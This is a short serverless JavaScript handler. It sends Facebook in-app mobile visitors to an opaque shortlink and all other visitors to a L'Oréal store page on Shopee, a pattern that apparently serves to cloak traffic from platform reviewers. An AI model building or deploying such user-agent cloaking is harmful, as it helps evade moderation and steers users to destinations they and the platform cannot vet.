export default {
  async fetch(request) {
    let userAgent = request.headers.get("User-Agent") || "";
    let isFacebookApp = userAgent.includes("FBAN") || userAgent.includes("FBAV");
    let isMobileDevice = /Android|iPhone|iPad|iPod/i.test(userAgent);

    if (isFacebookApp && isMobileDevice) {
      return Response.redirect("https://lfb.ink/031225", 302);
    } else {
      return Response.redirect("https://shopee.vn/lorealparis_officialstore", 302);
    }
  }
};
